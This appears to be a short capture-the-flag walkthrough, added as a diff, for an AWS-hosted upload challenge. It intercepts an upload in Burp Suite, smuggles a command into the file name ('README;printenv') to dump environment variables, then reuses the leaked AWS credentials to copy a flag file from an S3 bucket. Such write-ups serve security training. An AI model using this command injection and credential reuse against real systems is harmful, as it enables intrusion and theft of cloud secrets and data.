@@ -1,0 +1,27 @@
+Attack-defense
+
+https://cwlw44ht84.execute-api.ap-southeast-1.amazonaws.com/Prod
+
+enable burp proxy
+
+open burp suite
+
+now turn on intercept
+
+now upload the readme file which will generate code in intercept, right click to add code to repeater
+
+README;printenv
+
+then send the code to response
+
+In CMD do the following
+export AWS_ACCESS_KEY_ID=<Access Key value>
+export AWS_SECRET_ACCESS_KEY=<Secret Key value>
+export AWS_SESSION_TOKEN=<Session token value>
+
+aws s3 ls s3://temporary-public-image-store
+aws s3 cp s3://temporary-public-image-store/flag.txt ./
+cat flag.txt
+
+FLAG: 58f4d2122f6e5e1e23bd0a313a7ba1af
+Successfully retrieved flag.
